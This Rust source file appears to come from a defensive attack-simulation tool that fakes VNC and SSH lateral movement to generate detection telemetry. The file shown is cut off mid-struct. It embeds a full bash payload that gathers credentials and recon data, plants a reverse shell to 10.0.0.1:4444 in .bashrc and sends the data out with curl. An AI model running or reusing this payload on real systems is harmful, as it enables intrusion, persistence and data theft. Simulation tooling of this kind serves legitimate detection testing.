use crate::config::TechniqueConfig;
use crate::techniques::{AttackTechnique, SimulationResult, Technique, TechniqueParameter};
use crate::techniques::{ExecuteFuture, CleanupFuture};
use async_trait::async_trait;
use log::{info, warn};
use std::fs::File;
use std::io::Write;
use tokio::net::{TcpListener, TcpStream};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::time::{sleep, Duration, timeout};
use rand::Rng;
use des::Des;
use des::cipher::{KeyInit, BlockEncrypt};
#[allow(deprecated)]
use des::cipher::generic_array::GenericArray;

const SESSION_DURATION_SECS: u64 = 45;

// ==================== RFB (VNC) PROTOCOL IMPLEMENTATION ====================
// Per RFC 6143: The Remote Framebuffer Protocol
// TightVNC File Transfer Extension: Messages 132-133 (LibVNC protocol)

#[derive(Debug, Clone)]
struct RfbServerInit {
    framebuffer_width: u16,
    framebuffer_height: u16,
    bits_per_pixel: u8,
    depth: u8,
    big_endian_flag: u8,
    true_colour_flag: u8,
    red_max: u16,
    green_max: u16,
    blue_max: u16,
    red_shift: u8,
    green_shift: u8,
    blue_shift: u8,
    name: String,
}

impl RfbServerInit {
    fn new(name: String) -> Self {
        Self {
            framebuffer_width: 1024,
            framebuffer_height: 768,
            bits_per_pixel: 24,
            depth: 24,
            big_endian_flag: 0,
            true_colour_flag: 1,
            red_max: 255,
            green_max: 255,
            blue_max: 255,
            red_shift: 16,
            green_shift: 8,
            blue_shift: 0,
            name,
        }
    }

    fn to_bytes(&self) -> Vec<u8> {
        let mut bytes = Vec::new();
        bytes.extend_from_slice(&self.framebuffer_width.to_be_bytes());
        bytes.extend_from_slice(&self.framebuffer_height.to_be_bytes());
        bytes.push(self.bits_per_pixel);
        bytes.push(self.depth);
        bytes.push(self.big_endian_flag);
        bytes.push(self.true_colour_flag);
        bytes.extend_from_slice(&self.red_max.to_be_bytes());
        bytes.extend_from_slice(&self.green_max.to_be_bytes());
        bytes.extend_from_slice(&self.blue_max.to_be_bytes());
        bytes.push(self.red_shift);
        bytes.push(self.green_shift);
        bytes.push(self.blue_shift);
        bytes.extend_from_slice(&[0u8; 3]); // padding
        let name_bytes = self.name.as_bytes();
        bytes.extend_from_slice(&(name_bytes.len() as u32).to_be_bytes());
        bytes.extend_from_slice(name_bytes);
        bytes
    }
}

#[allow(deprecated)]
fn vnc_des_encrypt(challenge: &[u8; 16], password: &str) -> [u8; 16] {
    let mut key = [0u8; 8];
    let password_bytes = password.as_bytes();
    for (i, byte) in password_bytes.iter().take(8).enumerate() {
        key[i] = *byte;
    }
    
    // VNC uses reversed bits for DES key
    for byte in &mut key {
        *byte = byte.reverse_bits();
    }
    
    let cipher = Des::new(GenericArray::from_slice(&key));
    
    let mut response = [0u8; 16];
    for i in 0..2 {
        let block = GenericArray::from_slice(&challenge[i*8..(i+1)*8]);
        let mut encrypted = block.to_owned();
        cipher.encrypt_block(&mut encrypted);
        response[i*8..(i+1)*8].copy_from_slice(&encrypted);
    }
    
    response
}

fn build_tightvnc_upload_request(filename: &str, offset: u32) -> Vec<u8> {
    let mut msg = Vec::new();
    msg.push(132u8);
    msg.push(0u8);
    let filename_bytes = filename.as_bytes();
    msg.extend_from_slice(&(filename_bytes.len() as u16).to_be_bytes());
    msg.extend_from_slice(&offset.to_be_bytes());
    msg.extend_from_slice(filename_bytes);
    
    log::debug!(" [VNC FT] Built Upload Request: filename={}, len={}, offset={}", filename, filename_bytes.len(), offset);
    msg
}

fn build_tightvnc_upload_data(data: &[u8], compression_level: u8) -> Vec<u8> {
    let mut msg = Vec::new();
    msg.push(133u8);
    msg.push(compression_level);
    let data_len = data.len().min(65535) as u16;
    msg.extend_from_slice(&data_len.to_be_bytes());
    msg.extend_from_slice(&data_len.to_be_bytes());
    msg.extend_from_slice(&data[..data_len as usize]);
    
    log::debug!(" [VNC FT] Built Upload Data: {} bytes, compression={}", data_len, compression_level);
    msg
}

async fn rfb_victim_server(log_file: String, password: String) -> Result<String, String> {
    let mut log = File::create(&log_file)
        .map_err(|e| format!("Failed to create log file: {e}"))?;
    
    writeln!(log, "=== RFB (VNC) Server Started ===").unwrap();
    writeln!(log, "Timestamp: {}", chrono::Local::now()).unwrap();
    writeln!(log, "Binding to 0.0.0.0:5900").unwrap();
    
    log::debug!(" [VNC VICTIM] Attempting to bind TCP listener on 0.0.0.0:5900");
    
    let listener = TcpListener::bind("0.0.0.0:5900").await
        .map_err(|e| {
            log::error!(" [VNC VICTIM] Failed to bind port 5900: {}", e);
            format!("Failed to bind to port 5900: {e}")
        })?;
    
    log::debug!(" [VNC VICTIM] TCP listener bound successfully on 0.0.0.0:5900");
    info!("RFB server listening on port 5900");
    writeln!(log, "Server listening on port 5900").unwrap();
    writeln!(log, "Waiting for client connection...").unwrap();
    
    log::debug!(" [VNC VICTIM] Waiting for client connection (60s timeout)...");
    
    let accept_timeout = timeout(Duration::from_secs(60), listener.accept()).await;
    let (mut stream, client_addr) = match accept_timeout {
        Ok(Ok((stream, addr))) => {
            log::debug!(" [VNC VICTIM] Connection accepted from {}", addr);
            (stream, addr)
        },
        Ok(Err(e)) => {
            log::error!(" [VNC VICTIM] Accept failed: {}", e);
            return Err(format!("Accept failed: {e}"));
        },
        Err(_) => {
            log::warn!(" [VNC VICTIM] No client connected within 60 seconds (timeout)");
            return Err("No client connected within 60 seconds".to_string());
        },
    };
    
    info!("Client connected from: {client_addr}");
    writeln!(log, "\n=== Client Connected ===").unwrap();
    writeln!(log, "Client address: {client_addr}").unwrap();
    
    // Step 1: Send ProtocolVersion
    let protocol_version = b"RFB 003.008\n";
    stream.write_all(protocol_version).await
        .map_err(|e| format!("Failed to send protocol version: {e}"))?;
    writeln!(log, "Sent: RFB 003.008").unwrap();
    
    // Step 2: Receive client protocol version
    let mut client_version = [0u8; 12];
    stream.read_exact(&mut client_version).await
        .map_err(|e| format!("Failed to read client version: {e}"))?;
    writeln!(log, "Received: {}", String::from_utf8_lossy(&client_version).trim()).unwrap();
    
    // Step 3: Send security types (VNC Authentication = 2)
    let security_types = [1u8, 2u8]; // 1 type, type 2 (VNC Auth)
    stream.write_all(&security_types).await
        .map_err(|e| format!("Failed to send security types: {e}"))?;
    writeln!(log, "Sent security types: VNC Authentication (2)").unwrap();
    
    // Step 4: Receive client security type choice
    let mut security_choice = [0u8; 1];
    stream.read_exact(&mut security_choice).await
        .map_err(|e| format!("Failed to read security choice: {e}"))?;
    writeln!(log, "Client chose security type: {}", security_choice[0]).unwrap();
    
    // Step 5: VNC Authentication - send challenge
    let challenge: [u8; 16] = {
        let mut rng = rand::thread_rng();
        rng.gen()
    };
    stream.write_all(&challenge).await
        .map_err(|e| format!("Failed to send challenge: {e}"))?;
    writeln!(log, "Sent 16-byte authentication challenge").unwrap();
    
    // Step 6: Receive client response
    let mut client_response = [0u8; 16];
    stream.read_exact(&mut client_response).await
        .map_err(|e| format!("Failed to read auth response: {e}"))?;
    writeln!(log, "Received authentication response").unwrap();
    
    // Step 7: Verify response
    let expected_response = vnc_des_encrypt(&challenge, &password);
    let auth_ok = client_response == expected_response;
    
    let security_result = if auth_ok { 0u32 } else { 1u32 };
    stream.write_all(&security_result.to_be_bytes()).await
        .map_err(|e| format!("Failed to send security result: {e}"))?;
    writeln!(log, "Authentication: {}", if auth_ok { "SUCCESS" } else { "FAILED" }).unwrap();
    
    if !auth_ok {
        return Err("Client authentication failed".to_string());
    }
    
    // Step 8: Receive ClientInit
    let mut client_init = [0u8; 1];
    stream.read_exact(&mut client_init).await
        .map_err(|e| format!("Failed to read ClientInit: {e}"))?;
    writeln!(log, "Received ClientInit (shared={}))", client_init[0]).unwrap();
    
    // Step 9: Send ServerInit
    let server_init = RfbServerInit::new("SignalBench VNC Server".to_string());
    stream.write_all(&server_init.to_bytes()).await
        .map_err(|e| format!("Failed to send ServerInit: {e}"))?;
    writeln!(log, "Sent ServerInit ({}x{} @ {}bpp)", 
        server_init.framebuffer_width, 
        server_init.framebuffer_height,
        server_init.bits_per_pixel).unwrap();
    
    // Step 10: Handle client messages for 45 seconds (including file transfers)
    writeln!(log, "\n=== Active Session ({}s) ===", SESSION_DURATION_SECS).unwrap();
    let session_start = tokio::time::Instant::now();
    let mut framebuffer_update_count = 0;
    let mut message_count = 0;
    let mut file_upload_requests = 0;
    let mut file_upload_data_chunks = 0;
    let mut total_bytes_uploaded = 0u64;
    
    loop {
        if session_start.elapsed().as_secs() >= SESSION_DURATION_SECS {
            break;
        }
        
        let read_timeout = timeout(Duration::from_millis(500), async {
            let mut msg_type = [0u8; 1];
            stream.read_exact(&mut msg_type).await?;
            Ok::<u8, std::io::Error>(msg_type[0])
        }).await;
        
        match read_timeout {
            Ok(Ok(msg_type)) => {
                message_count += 1;
                
                match msg_type {
                    132 => {
                        log::info!(" [VNC FT] Received Upload Request (msg 132)");
                        let mut compression = [0u8; 1];
                        stream.read_exact(&mut compression).await.ok();
                        let mut filename_len = [0u8; 2];
                        stream.read_exact(&mut filename_len).await.ok();
                        let filename_length = u16::from_be_bytes(filename_len) as usize;
                        let mut offset_bytes = [0u8; 4];
                        stream.read_exact(&mut offset_bytes).await.ok();
                        let offset = u32::from_be_bytes(offset_bytes);
                        let mut filename = vec![0u8; filename_length.min(256)];
                        stream.read_exact(&mut filename).await.ok();
                        let filename_str = String::from_utf8_lossy(&filename);
                        
                        writeln!(log, "\n=== TightVNC File Upload Request ===").unwrap();
                        writeln!(log, "Message type: 132 (Upload Request)").unwrap();
                        writeln!(log, "Filename: {}", filename_str).unwrap();
                        writeln!(log, "Offset: {}", offset).unwrap();
                        writeln!(log, "Compression level: {}", compression[0]).unwrap();
                        log::info!(" [VNC FT] Upload Request: filename={}, offset={}", filename_str, offset);
                        file_upload_requests += 1;
                    },
                    133 => {
                        let mut compression = [0u8; 1];
                        stream.read_exact(&mut compression).await.ok();
                        let mut uncompressed_size = [0u8; 2];
                        stream.read_exact(&mut uncompressed_size).await.ok();
                        let uncompressed_len = u16::from_be_bytes(uncompressed_size) as usize;
                        let mut compressed_size = [0u8; 2];
                        stream.read_exact(&mut compressed_size).await.ok();
                        let compressed_len = u16::from_be_bytes(compressed_size) as usize;
                        let mut data = vec![0u8; compressed_len.min(65535)];
                        stream.read_exact(&mut data).await.ok();
                        
                        writeln!(log, "TightVNC Upload Data (msg 133): {} bytes (uncompressed: {})", compressed_len, uncompressed_len).unwrap();
                        log::debug!(" [VNC FT] Received Upload Data (msg 133): {} bytes", compressed_len);
                        file_upload_data_chunks += 1;
                        total_bytes_uploaded += compressed_len as u64;
                    },
                    _ => {
                        // Standard RFB message - send framebuffer update
                        let update_msg = vec![
                            0u8, // FramebufferUpdate
                            0u8, // padding
                            0u8, 1u8, // number of rectangles (1)
                            0u8, 0u8, // x-position
                            0u8, 0u8, // y-position
                            0u8, 100u8, // width
                            0u8, 100u8, // height
                            0u8, 0u8, 0u8, 0u8, // encoding (raw)
                        ];
                        stream.write_all(&update_msg).await.ok();
                        let pixel_data = vec![0u8; 100 * 100 * 3];
                        stream.write_all(&pixel_data).await.ok();
                        framebuffer_update_count += 1;
                    }
                }
            }
            _ => {
                sleep(Duration::from_millis(100)).await;
            }
        }
    }
    
    writeln!(log, "\n=== Session Summary ===").unwrap();
    writeln!(log, "Duration: {}s", SESSION_DURATION_SECS).unwrap();
    writeln!(log, "Client messages received: {}", message_count).unwrap();
    writeln!(log, "Framebuffer updates sent: {}", framebuffer_update_count).unwrap();
    writeln!(log, "File upload requests received: {}", file_upload_requests).unwrap();
    writeln!(log, "File upload data chunks received: {}", file_upload_data_chunks).unwrap();
    writeln!(log, "Total bytes uploaded: {}", total_bytes_uploaded).unwrap();
    writeln!(log, "Status: COMPLETED").unwrap();
    
    if file_upload_requests > 0 {
        log::info!(" [VNC FT] Session summary: {} upload requests, {} data chunks, {} total bytes", file_upload_requests, file_upload_data_chunks, total_bytes_uploaded);
    }
    
    info!("RFB session completed with file transfers");
    Ok(format!("RFB server session completed: {} messages, {} framebuffer updates, {} file uploads ({} bytes)", message_count, framebuffer_update_count, file_upload_requests, total_bytes_uploaded))
}

async fn rfb_attacker_client(target_ip: String, log_file: String, password: String) -> Result<String, String> {
    let mut log = File::create(&log_file)
        .map_err(|e| format!("Failed to create log file: {e}"))?;
    
    writeln!(log, "=== RFB (VNC) Client Started ===").unwrap();
    writeln!(log, "Timestamp: {}", chrono::Local::now()).unwrap();
    writeln!(log, "Target: {target_ip}:5900").unwrap();
    
    log::debug!(" [VNC ATTACKER] Waiting 10s for victim to bind port 5900...");
    writeln!(log, "Waiting 10s for victim to bind port...").unwrap();
    sleep(Duration::from_secs(10)).await;
    log::debug!(" [VNC ATTACKER] Delay complete, attempting connection");
    
    info!("Connecting to RFB server at {target_ip}:5900");
    
    log::debug!(" [VNC ATTACKER] Attempting TCP connection to {}:5900 (10s timeout)", target_ip);
    
    let connect_result = timeout(Duration::from_secs(10), TcpStream::connect(format!("{target_ip}:5900"))).await;
    let mut stream = match connect_result {
        Ok(Ok(stream)) => {
            log::debug!(" [VNC ATTACKER] TCP connection established to {}:5900", target_ip);
            stream
        },
        Ok(Err(e)) => {
            log::error!(" [VNC ATTACKER] Connection failed to {}:5900: {}", target_ip, e);
            return Err(format!("Connection failed: {e}"));
        },
        Err(_) => {
            log::error!(" [VNC ATTACKER] Connection timeout to {}:5900 (no response within 10s)", target_ip);
            return Err("Connection timeout".to_string());
        },
    };
    
    writeln!(log, "Connected to {target_ip}:5900").unwrap();
    
    // Step 1: Receive ProtocolVersion
    let mut server_version = [0u8; 12];
    stream.read_exact(&mut server_version).await
        .map_err(|e| format!("Failed to read server version: {e}"))?;
    writeln!(log, "Received: {}", String::from_utf8_lossy(&server_version).trim()).unwrap();
    
    // Step 2: Send client protocol version
    stream.write_all(b"RFB 003.008\n").await
        .map_err(|e| format!("Failed to send protocol version: {e}"))?;
    writeln!(log, "Sent: RFB 003.008").unwrap();
    
    // Step 3: Receive security types
    let mut num_types = [0u8; 1];
    stream.read_exact(&mut num_types).await
        .map_err(|e| format!("Failed to read security types count: {e}"))?;
    let mut types = vec![0u8; num_types[0] as usize];
    stream.read_exact(&mut types).await
        .map_err(|e| format!("Failed to read security types: {e}"))?;
    writeln!(log, "Received {} security types: {:?}", num_types[0], types).unwrap();
    
    // Step 4: Choose VNC Authentication (type 2)
    stream.write_all(&[2u8]).await
        .map_err(|e| format!("Failed to send security choice: {e}"))?;
    writeln!(log, "Chose VNC Authentication (2)").unwrap();
    
    // Step 5: Receive challenge
    let mut challenge = [0u8; 16];
    stream.read_exact(&mut challenge).await
        .map_err(|e| format!("Failed to read challenge: {e}"))?;
    writeln!(log, "Received 16-byte authentication challenge").unwrap();
    
    // Step 6: Encrypt and send response
    let response = vnc_des_encrypt(&challenge, &password);
    stream.write_all(&response).await
        .map_err(|e| format!("Failed to send auth response: {e}"))?;
    writeln!(log, "Sent DES-encrypted response").unwrap();
    
    // Step 7: Receive security result
    let mut security_result = [0u8; 4];
    stream.read_exact(&mut security_result).await
        .map_err(|e| format!("Failed to read security result: {e}"))?;
    let result = u32::from_be_bytes(security_result);
    writeln!(log, "Security result: {}", if result == 0 { "OK" } else { "FAILED" }).unwrap();
    
    if result != 0 {
        return Err("Authentication failed".to_string());
    }
    
    // Step 8: Send ClientInit
    stream.write_all(&[1u8]).await // shared = 1
        .map_err(|e| format!("Failed to send ClientInit: {e}"))?;
    writeln!(log, "Sent ClientInit (shared=1)").unwrap();
    
    // Step 9: Receive ServerInit
    let mut framebuffer_width = [0u8; 2];
    stream.read_exact(&mut framebuffer_width).await
        .map_err(|e| format!("Failed to read ServerInit: {e}"))?;
    let mut server_init_rest = vec![0u8; 18];
    stream.read_exact(&mut server_init_rest).await.ok();
    let mut name_len = [0u8; 4];
    stream.read_exact(&mut name_len).await.ok();
    let name_length = u32::from_be_bytes(name_len) as usize;
    let mut name = vec![0u8; name_length.min(256)];
    stream.read_exact(&mut name).await.ok();
    writeln!(log, "Received ServerInit: {}", String::from_utf8_lossy(&name)).unwrap();
    
    // Step 10: Interact for 45 seconds with file transfers
    writeln!(log, "\n=== Active Session ({}s) ===", SESSION_DURATION_SECS).unwrap();
    let session_start = tokio::time::Instant::now();
    let mut update_requests_sent = 0;
    let mut pointer_events_sent = 0;
    let mut files_uploaded = 0;
    let mut gocortex_uploaded = false;
    let mut ssigre_uploaded = false;
    
    loop {
        let elapsed = session_start.elapsed().as_secs();
        if elapsed >= SESSION_DURATION_SECS {
            break;
        }
        
        // Upload gocortex.sh at 10 seconds
        if elapsed >= 10 && !gocortex_uploaded {
            writeln!(log, "\n=== TightVNC File Transfer: gocortex.sh ===").unwrap();
            log::info!(" [VNC FT] Starting upload: gocortex.sh (8192 bytes)");
            
            let upload_req = build_tightvnc_upload_request("gocortex.sh", 0);
            stream.write_all(&upload_req).await.ok();
            writeln!(log, "Sent Upload Request (msg 132): filename=gocortex.sh, offset=0").unwrap();
            
            let mut file_data = b"#!/bin/bash\n# GoCortex lateral movement payload\n# This script establishes persistence and performs reconnaissance\n\nHOST=$(hostname)\nUSER=$(whoami)\nIP=$(ip -4 addr show | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}' | grep -v '127.0.0.1' | head -1)\n\necho \"[+] GoCortex deployed on $HOST\"\necho \"[+] User: $USER\"\necho \"[+] IP: $IP\"\n\n# Enumerate running processes\nps aux > /tmp/.gocortex_proc.log\n\n# Enumerate network connections\nnetstat -tulpn 2>/dev/null > /tmp/.gocortex_net.log\n\n# Enumerate sudo permissions\nsudo -l 2>/dev/null > /tmp/.gocortex_sudo.log\n\n# Enumerate crontabs\ncrontab -l 2>/dev/null > /tmp/.gocortex_cron.log\n\n# Search for credentials\ngrep -r 'password' /home/$USER/.config 2>/dev/null > /tmp/.gocortex_creds.log\n\n# Establish persistence via .bashrc\necho 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 &' >> ~/.bashrc\n\n# Exfiltrate data\ntar -czf /tmp/.gocortex_exfil.tar.gz /tmp/.gocortex_*.log\ncurl -X POST -F 'file=@/tmp/.gocortex_exfil.tar.gz' http://10.0.0.1:8080/upload 2>/dev/null\n\n# Clean up\nrm -f /tmp/.gocortex_*.log /tmp/.gocortex_exfil.tar.gz\n\necho \"[+] GoCortex execution complete\"\n".to_vec();
            while file_data.len() < 8192 {
                file_data.push(b'#');
            }
            file_data.truncate(8192);
            
            for chunk_start in (0..file_data.len()).step_by(8192) {
                let chunk_end = (chunk_start + 8192).min(file_data.len());
                let chunk = &file_data[chunk_start..chunk_end];
                let upload_data = build_tightvnc_upload_data(chunk, 0);
                stream.write_all(&upload_data).await.ok();
                writeln!(log, "Sent Upload Data (msg 133): {} bytes, chunk {}/{}", chunk.len(), chunk_start/8192 + 1, file_data.len().div_ceil(8192)).unwrap();
            }
            
            gocortex_uploaded = true;
            files_uploaded += 1;
            log::info!(" [VNC FT] Completed upload: gocortex.sh");
            writeln!(log, "File transfer complete: gocortex.sh ({} bytes)", file_data.len()).unwrap();
        }
        
        // Upload ssigre-malware.bin at 20 seconds
        if elapsed >= 20 && !ssigre_uploaded {
            writeln!(log, "\n=== TightVNC File Transfer: ssigre-malware.bin ===").unwrap();
            log::info!(" [VNC FT] Starting upload: ssigre-malware.bin (24576 bytes)");
            
            let upload_req = build_tightvnc_upload_request("ssigre-malware.bin", 0);
            stream.write_all(&upload_req).await.ok();
            writeln!(log, "Sent Upload Request (msg 132): filename=ssigre-malware.bin, offset=0").unwrap();
            
            let mut file_data = vec![0x7Fu8, 0x45, 0x4C, 0x46];
            file_data.extend_from_slice(b"\x02\x01\x01\x00");
            {
                let mut rng = rand::thread_rng();
                for _ in 0..(24576 - 8) {
                    file_data.push(rng.gen());
                }
            }
            
            for chunk_start in (0..file_data.len()).step_by(8192) {
                let chunk_end = (chunk_start + 8192).min(file_data.len());
                let chunk = &file_data[chunk_start..chunk_end];
                let upload_data = build_tightvnc_upload_data(chunk, 0);
                stream.write_all(&upload_data).await.ok();
                writeln!(log, "Sent Upload Data (msg 133): {} bytes, chunk {}/{}", chunk.len(), chunk_start/8192 + 1, file_data.len().div_ceil(8192)).unwrap();
            }
            
            ssigre_uploaded = true;
            files_uploaded += 1;
            log::info!(" [VNC FT] Completed upload: ssigre-malware.bin");
            writeln!(log, "File transfer complete: ssigre-malware.bin ({} bytes)", file_data.len()).unwrap();
        }
        
        // Send FramebufferUpdateRequest
        let update_request = vec![
            3u8, // message type
            1u8, // incremental
            0u8, 0u8, // x
            0u8, 0u8, // y
            0u8, 100u8, // width
            0u8, 100u8, // height
        ];
        stream.write_all(&update_request).await.ok();
        update_requests_sent += 1;
        
        // Send PointerEvent (simulate mouse movement)
        let (x, y) = {
            let mut rng = rand::thread_rng();
            (rng.gen_range(0..1024), rng.gen_range(0..768))
        };
        let pointer_event = [
            5u8, // message type
            0u8, // button mask
            (x >> 8) as u8, (x & 0xFF) as u8,
            (y >> 8) as u8, (y & 0xFF) as u8,
        ];
        stream.write_all(&pointer_event).await.ok();
        pointer_events_sent += 1;
        
        sleep(Duration::from_millis(500)).await;
    }
    
    writeln!(log, "\n=== Session Summary ===").unwrap();
    writeln!(log, "Duration: {}s", SESSION_DURATION_SECS).unwrap();
    writeln!(log, "FramebufferUpdateRequests sent: {}", update_requests_sent).unwrap();
    writeln!(log, "PointerEvents sent: {}", pointer_events_sent).unwrap();
    writeln!(log, "Files uploaded (TightVNC): {}", files_uploaded).unwrap();
    writeln!(log, "Status: COMPLETED").unwrap();
    
    info!("RFB client session completed with file transfers");
    Ok(format!("RFB client session completed: {} update requests, {} pointer events, {} files uploaded", update_requests_sent, pointer_events_sent, files_uploaded))
}

// ==================== SSH PROTOCOL IMPLEMENTATION ====================
// Simplified SSH protocol for telemetry generation

async fn ssh_victim_server(log_file: String) -> Result<String, String> {
    let mut log = File::create(&log_file)
        .map_err(|e| format!("Failed to create log file: {e}"))?;
    
    writeln!(log, "=== SSH Server Started ===").unwrap();
    writeln!(log, "Timestamp: {}", chrono::Local::now()).unwrap();
    writeln!(log, "Binding to 0.0.0.0:2222").unwrap();
    
    log::debug!(" [SSH VICTIM] Attempting to bind TCP listener on 0.0.0.0:2222");
    
    let listener = TcpListener::bind("0.0.0.0:2222").await
        .map_err(|e| {
            log::error!(" [SSH VICTIM] Failed to bind port 2222: {}", e);
            format!("Failed to bind to port 2222: {e}")
        })?;
    
    log::debug!(" [SSH VICTIM] TCP listener bound successfully on 0.0.0.0:2222");
    info!("SSH server listening on port 2222");
    writeln!(log, "Server listening on port 2222").unwrap();
    
    log::debug!(" [SSH VICTIM] Waiting for client connection (60s timeout)...");
    
    let accept_timeout = timeout(Duration::from_secs(60), listener.accept()).await;
    let (mut stream, client_addr) = match accept_timeout {
        Ok(Ok((stream, addr))) => {
            log::debug!(" [SSH VICTIM] Connection accepted from {}", addr);
            (stream, addr)
        },
        Ok(Err(e)) => {
            log::error!(" [SSH VICTIM] Accept failed: {}", e);
            return Err(format!("Accept failed: {e}"));
        },
        Err(_) => {
            log::warn!(" [SSH VICTIM] No client connected within 60 seconds (timeout)");
            return Err("No client connected within 60 seconds".to_string());
        },
    };
    
    info!("Client connected from: {client_addr}");
    writeln!(log, "\n=== Client Connected ===").unwrap();
    writeln!(log, "Client address: {client_addr}").unwrap();
    
    // Step 1: Send SSH version
    let server_version = b"SSH-2.0-SignalBench_SSH_1.0\r\n";
    stream.write_all(server_version).await
        .map_err(|e| format!("Failed to send version: {e}"))?;
    writeln!(log, "Sent: SSH-2.0-SignalBench_SSH_1.0").unwrap();
    
    // Step 2: Receive client version
    let mut client_version = vec![0u8; 255];
    let bytes_read = timeout(Duration::from_secs(5), stream.read(&mut client_version)).await
        .map_err(|_| "Read timeout")?
        .map_err(|e| format!("Failed to read client version: {e}"))?;
    let version_str = String::from_utf8_lossy(&client_version[..bytes_read]);
    writeln!(log, "Received: {}", version_str.trim()).unwrap();
    
    // Step 3: Simulate KEX, auth, and channel operations
    writeln!(log, "\n=== Key Exchange ===").unwrap();
    writeln!(log, "Simulating key exchange init").unwrap();
    let kex_init = vec![0u8; 256]; // Simplified KEX message
    stream.write_all(&kex_init).await.ok();
    writeln!(log, "Sent KEX_INIT packet").unwrap();
    
    // Step 4: Authentication
    writeln!(log, "\n=== Authentication ===").unwrap();
    writeln!(log, "Accepting authentication (simulated)").unwrap();
    let auth_success = b"Authentication successful\n";
    stream.write_all(auth_success).await.ok();
    writeln!(log, "Sent: Authentication successful").unwrap();
    
    // Step 5: Active session
    writeln!(log, "\n=== Active Session ({}s) ===", SESSION_DURATION_SECS).unwrap();
    let session_start = tokio::time::Instant::now();
    let mut channel_requests = 0;
    
    loop {
        if session_start.elapsed().as_secs() >= SESSION_DURATION_SECS {
            break;
        }
        
        // Simulate channel data exchange
        let data = b"Shell output data\n";
        stream.write_all(data).await.ok();
        channel_requests += 1;
        
        sleep(Duration::from_secs(2)).await;
    }
    
    writeln!(log, "\n=== Session Summary ===").unwrap();
    writeln!(log, "Duration: {}s", SESSION_DURATION_SECS).unwrap();
    writeln!(log, "Channel data exchanges: {}", channel_requests).unwrap();
    writeln!(log, "Status: COMPLETED").unwrap();
    
    info!("SSH session completed");
    Ok(format!("SSH server session completed: {} channel exchanges", channel_requests))
}

async fn ssh_attacker_client(target_ip: String, log_file: String) -> Result<String, String> {
    let mut log = File::create(&log_file)
        .map_err(|e| format!("Failed to create log file: {e}"))?;
    
    writeln!(log, "=== SSH Client Started ===").unwrap();
    writeln!(log, "Timestamp: {}", chrono::Local::now()).unwrap();
    writeln!(log, "Target: {target_ip}:2222").unwrap();
    
    log::debug!(" [SSH ATTACKER] Waiting 10s for victim to bind port 2222...");
    writeln!(log, "Waiting 10s for victim to bind port...").unwrap();
    sleep(Duration::from_secs(10)).await;
    log::debug!(" [SSH ATTACKER] Delay complete, attempting connection");
    
    info!("Connecting to SSH server at {target_ip}:2222");
    
    log::debug!(" [SSH ATTACKER] Attempting TCP connection to {}:2222 (10s timeout)", target_ip);
    
    let connect_result = timeout(Duration::from_secs(10), TcpStream::connect(format!("{target_ip}:2222"))).await;
    let mut stream = match connect_result {
        Ok(Ok(stream)) => {
            log::debug!(" [SSH ATTACKER] TCP connection established to {}:2222", target_ip);
            stream
        },
        Ok(Err(e)) => {
            log::error!(" [SSH ATTACKER] Connection failed to {}:2222: {}", target_ip, e);
            return Err(format!("Connection failed: {e}"));
        },
        Err(_) => {
            log::error!(" [SSH ATTACKER] Connection timeout to {}:2222 (no response within 10s)", target_ip);
            return Err("Connection timeout".to_string());
        },
    };
    
    writeln!(log, "Connected to {target_ip}:2222").unwrap();
    
    // Step 1: Receive server version
    let mut server_version = vec![0u8; 255];
    let bytes_read = timeout(Duration::from_secs(5), stream.read(&mut server_version)).await
        .map_err(|_| "Read timeout")?
        .map_err(|e| format!("Failed to read: {e}"))?;
    writeln!(log, "Received: {}", String::from_utf8_lossy(&server_version[..bytes_read]).trim()).unwrap();
    
    // Step 2: Send client version
    let client_version = b"SSH-2.0-SignalBench_Client_1.0\r\n";
    stream.write_all(client_version).await
        .map_err(|e| format!("Failed to send version: {e}"))?;
    writeln!(log, "Sent: SSH-2.0-SignalBench_Client_1.0").unwrap();
    
    // Step 3: KEX
    writeln!(log, "\n=== Key Exchange ===").unwrap();
    let kex_init = vec![0u8; 256];
    stream.write_all(&kex_init).await.ok();
    writeln!(log, "Sent KEX_INIT packet").unwrap();
    
    // Step 4: Authentication
    writeln!(log, "\n=== Authentication ===").unwrap();
    let auth_request = b"password authentication\n";
    stream.write_all(auth_request).await.ok();
    writeln!(log, "Sent authentication request").unwrap();
    
    // Step 5: Active session
    writeln!(log, "\n=== Active Session ({}s) ===", SESSION_DURATION_SECS).unwrap();
    let session_start = tokio::time::Instant::now();
    let mut commands_sent = 0;
    
    let commands = ["whoami", "uname -a", "id", "pwd", "env"];
    
    loop {
        if session_start.elapsed().as_secs() >= SESSION_DURATION_SECS {
            break;
        }
        
        let cmd_idx = commands_sent % commands.len();
        let cmd = format!("{}\n", commands[cmd_idx]);
        stream.write_all(cmd.as_bytes()).await.ok();
        writeln!(log, "Sent command: {}", commands[cmd_idx]).unwrap();
        commands_sent += 1;
        
        sleep(Duration::from_secs(2)).await;
    }
    
    writeln!(log, "\n=== Session Summary ===").unwrap();
    writeln!(log, "Duration: {}s", SESSION_DURATION_SECS).unwrap();
    writeln!(log, "Commands sent: {}", commands_sent).unwrap();
    writeln!(log, "Status: COMPLETED").unwrap();
    
    info!("SSH client session completed");
    Ok(format!("SSH client session completed: {} commands sent", commands_sent))
}

// ==================== TECHNIQUE IMPLEMENTATIONS ====================

pub struct VncProtoLateralMovement {}

#[async_trait]
impl AttackTechnique for VncProtoLateralMovement {
    fn info(&self) -> Technique {
        Technique {
            id: "T1021.005-PROTO".to_string(),
            name: "VNC Protocol Lateral Movement".to_string(),
            description: "Implements the RFB (Remote Framebuffer) protocol per RFC 6143 plus TightVNC file transfer extension to generate authentic VNC lateral movement telemetry with data exfiltration. The victim runs an RFB server on port 5900, handling full protocol handshake including ProtocolVersion negotiation, VNC Authentication with DES-encrypted challenge/response, and ServerInit. The attacker connects as an RFB client, completes authentication, and simulates a 45-second active VNC session with FramebufferUpdateRequests, PointerEvents, and TightVNC file uploads (messages 132-133). Files uploaded: gocortex.sh (malicious bash script) and ssigre-malware.bin (ELF binary). All traffic is cleartext (no TLS) for maximum visibility to security products. Requires Voltron multi-host coordination.".to_string(),
            category: "Lateral Movement".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "vnc_password".to_string(),
                    description: "VNC password for authentication (max 8 chars per DES limitation)".to_string(),
                    required: false,
                    default: Some("signalbench".to_string()),
                },
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "Path to save RFB protocol log".to_string(),
                    required: false,
